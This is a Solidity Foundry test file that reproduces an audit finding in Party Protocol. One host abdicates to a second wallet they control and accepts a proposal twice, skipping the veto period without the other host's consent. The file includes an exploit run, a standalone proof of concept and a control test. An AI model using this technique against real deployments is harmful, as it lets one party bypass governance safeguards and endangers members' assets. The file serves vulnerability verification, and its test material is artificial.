// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./29546-h-02-single-host-can-unfairly-skip-veto-period-for-proposal.sol";

/*//////////////////////////////////////////////////////////////
    Party Protocol — single host can unfairly skip veto period (H-02, #29546)

    abdicateHost lets a host move their host status to another wallet they
    also control, with no snapshot of who was a host at proposal time. A
    single host can accept once, abdicate to a second wallet, and accept
    again — reaching numHostsAccepted == numHosts and skipping the veto
    period, even though the OTHER genuine host never accepted.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm (veto skipped, honest host never accepted)
      independently.
    - test_maliciousHost_standalone: standalone rebuild with EOA actors,
      mirroring the finding's own `test_maliciousHost` PoC shape.
    - test_control_bothHostsMustAccept: control — without abdicating, a
      single host's accept is NOT enough to skip the veto period; only when
      BOTH real hosts accept does it correctly transition to Ready.
//////////////////////////////////////////////////////////////*/
contract SkipVetoPeriodTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        PartyGovernance game = e.game();
        uint256 id = e.PROPOSAL_ID();

        assertEq(uint8(game.proposalStatus(id)), uint8(PartyGovernance.ProposalStatus.Ready), "veto period skipped");
        assertEq(game.numHostsAccepted(id), 2, "two accepts recorded");
        assertFalse(game.hostAccepted(id, address(e.bob())), "the honest host never actually accepted");
    }

    function test_maliciousHost_standalone() public {
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        address aliceAltWallet = makeAddr("aliceAltWallet");
        uint256 proposalId = 1;

        PartyGovernance game = new PartyGovernance(alice, bob);
        game.propose(proposalId);

        vm.prank(alice);
        game.accept(proposalId);
        assertEq(game.numHostsAccepted(proposalId), 1);
        assertEq(uint8(game.proposalStatus(proposalId)), uint8(PartyGovernance.ProposalStatus.Passed), "not Ready yet");

        // Alice abdicates to her alt wallet.
        vm.prank(alice);
        game.abdicateHost(aliceAltWallet);
        assertFalse(game.isHost(alice));
        assertTrue(game.isHost(aliceAltWallet));

        // Alice accepts AGAIN, from her alt wallet.
        vm.prank(aliceAltWallet);
        game.accept(proposalId);

        assertEq(game.numHostsAccepted(proposalId), 2);
        assertEq(uint8(game.proposalStatus(proposalId)), uint8(PartyGovernance.ProposalStatus.Ready), "veto skipped");
        assertFalse(game.hostAccepted(proposalId, bob), "bob (the real other host) never accepted");
    }

    /// @notice Control: without any abdication, a single host's accept is
    ///         NOT sufficient to skip the veto period. Only when BOTH real
    ///         hosts accept does the proposal correctly become Ready.
    function test_control_bothHostsMustAccept() public {
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        uint256 proposalId = 1;

        PartyGovernance game = new PartyGovernance(alice, bob);
        game.propose(proposalId);

        vm.prank(alice);
        game.accept(proposalId);
        assertEq(uint8(game.proposalStatus(proposalId)), uint8(PartyGovernance.ProposalStatus.Passed), "still Passed with 1/2 accepts");

        vm.prank(bob);
        game.accept(proposalId);
        assertEq(uint8(game.proposalStatus(proposalId)), uint8(PartyGovernance.ProposalStatus.Ready), "Ready once BOTH real hosts accept");
    }
}
